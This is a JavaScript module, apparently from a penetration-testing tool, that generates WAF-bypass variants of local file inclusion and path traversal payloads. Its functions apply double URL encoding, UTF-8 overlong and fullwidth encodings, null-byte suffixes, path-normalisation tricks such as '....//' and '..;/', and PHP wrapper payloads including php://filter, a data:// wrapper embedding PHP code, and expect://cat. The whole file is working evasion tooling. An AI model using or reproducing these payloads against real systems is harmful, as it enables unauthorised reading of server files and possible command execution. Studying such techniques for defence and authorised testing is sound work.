/**
 * LFI / Path Traversal WAF Bypass Engine
 * Generates multiple evasion variants for LFI/Path Traversal payloads.
 * Supports: PHP, Java, .NET, Generic
 */

import { urlEncode, doubleUrlEncode } from '../utils/encoding'
import { detectTraversal, pickOne } from '../utils/helpers'

/* ── Double URL Encoding ──────────────────────────── */
function applyDoubleUrl(payload) {
  const variants = []
  // Double encode ../ 
  const v1 = payload.replace(/\.\.\//g, '%252e%252e%252f')
  variants.push(v1)
  // Double encode only dots
  const v2 = payload.replace(/\.\./g, '%252e%252e').replace(/\//g, '%252f')
  variants.push(v2)
  // Full double URL encode
  variants.push(doubleUrlEncode(payload))
  // Single URL encode
  const v4 = payload.replace(/\.\.\//g, '%2e%2e%2f')
  variants.push(v4)
  return variants
}

/* ── Unicode / UTF-8 Overlong Encoding ────────────── */
function applyUnicodeEncoding(payload) {
  const variants = []
  
  // %u002e%u002e%u002f (IIS Unicode)
  const v1 = payload.replace(/\.\.\//g, '%u002e%u002e%u002f')
  variants.push(v1)
  
  // ..%c0%af (UTF-8 overlong / for Apache)
  const v2 = payload.replace(/\.\.\//g, '..%c0%af')
  variants.push(v2)
  
  // %e0%80%ae%e0%80%ae%c0%af (triple-byte overlong)
  const v3 = payload.replace(/\.\.\//g, '%e0%80%ae%e0%80%ae%c0%af')
  variants.push(v3)
  
  // ..%ef%bc%8f (fullwidth solidus ／)
  const v4 = payload.replace(/\.\.\//g, '..%ef%bc%8f')
  variants.push(v4)
  
  // ..%c1%9c (overlong encoding of \)
  const v5 = payload.replace(/\.\.\//g, '..%c1%9c')
  variants.push(v5)

  return variants
}

/* ── Null Byte Injection ──────────────────────────── */
function applyNullByte(payload) {
  const variants = []
  // Append %00
  variants.push(payload + '%00')
  // Append %00.jpg (bypass extension check)
  variants.push(payload + '%00.jpg')
  // Append %00.png
  variants.push(payload + '%00.png')
  // Null byte before extension
  variants.push(payload + '\x00')
  // Null byte with URL encoding
  variants.push(payload + '%2500')
  return variants
}

/* ── Path Normalization Tricks ────────────────────── */
function applyPathNormalization(payload) {
  const variants = []
  const { depth, targetFile } = detectTraversal(payload)
  
  // ....// (double dot-slash collapse)
  const doubleSlash = '....//'.repeat(depth) + targetFile
  variants.push(doubleSlash)
  
  // ..././ (triple dot with single slash)
  const tripleDot = '..././'.repeat(depth) + targetFile
  variants.push(tripleDot)
  
  // \..\/ (mixed separators)
  const mixedSep = '..\\'.repeat(depth) + targetFile.replace(/\//g, '\\')
  variants.push(mixedSep)
  
  // ..;/ (Tomcat/Java path parameter bypass)
  const semicolon = '..;/'.repeat(depth) + targetFile
  variants.push(semicolon)
  
  // /../ with leading slash
  const leadingSlash = '/..'.repeat(depth) + '/' + targetFile
  variants.push(leadingSlash)
  
  // /./../../ (with current directory refs)
  const withDot = './' + '../'.repeat(depth) + targetFile
  variants.push(withDot)

  // ..%5c (backslash URL encoded for IIS)
  const backslashEncoded = '..%5c'.repeat(depth) + targetFile
  variants.push(backslashEncoded)

  return variants
}

/* ── PHP Wrapper Bypass ───────────────────────────── */
function applyWrapperBypass(payload) {
  const variants = []
  const { targetFile } = detectTraversal(payload)
  const file = targetFile || payload
  
  // php://filter base64
  variants.push(`php://filter/convert.base64-encode/resource=${file}`)
  
  // php://filter with read
  variants.push(`php://filter/read=convert.base64-encode/resource=${file}`)
  
  // php://filter rot13
  variants.push(`php://filter/convert.string.rot13/resource=${file}`)
  
  // php://filter multiple chains
  variants.push(`php://filter/convert.base64-encode|convert.base64-decode/resource=${file}`)
  
  // data:// wrapper
  variants.push(`data://text/plain;base64,${btoa(`<?php echo file_get_contents("${file}"); ?>`)}`)
  
  // expect:// wrapper
  variants.push(`expect://cat ${file}`)
  
  // php://input (POST based)
  variants.push('php://input')
  
  // file:// explicit
  variants.push(`file://${file.startsWith('/') ? '' : '/'}${file}`)

  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateLfiVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('double-url')) {
    applyDoubleUrl(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Double URL Encoding', layers: ['double-url'] })
    })
  }

  if (layers.includes('unicode-encoding')) {
    applyUnicodeEncoding(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Unicode Encoding', layers: ['unicode-encoding'] })
    })
  }

  if (layers.includes('null-byte')) {
    applyNullByte(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Null Byte', layers: ['null-byte'] })
    })
  }

  if (layers.includes('path-normalization')) {
    applyPathNormalization(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Path Normalization', layers: ['path-normalization'] })
    })
  }

  if (layers.includes('wrapper-bypass') && (target === 'php' || target === 'generic')) {
    applyWrapperBypass(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Wrapper Bypass', layers: ['wrapper-bypass'] })
    })
  }

  // Combos
  if (layers.length >= 2) {
    if (layers.includes('double-url') && layers.includes('null-byte')) {
      const combo = payload.replace(/\.\.\//g, '%252e%252e%252f') + '%00'
      allVariants.push({ payload: combo, label: 'Double URL + Null', layers: ['double-url', 'null-byte'] })
    }

    if (layers.includes('path-normalization') && layers.includes('unicode-encoding')) {
      const { depth, targetFile } = detectTraversal(payload)
      const combo = '..%c0%af'.repeat(depth) + targetFile
      allVariants.push({ payload: combo, label: 'Path + Unicode', layers: ['path-normalization', 'unicode-encoding'] })
    }
  }

  // Deduplicate
  const seen = new Set()
  const unique = allVariants.filter(v => {
    if (seen.has(v.payload)) return false
    seen.add(v.payload)
    return true
  })

  return unique.slice(0, 12)
}
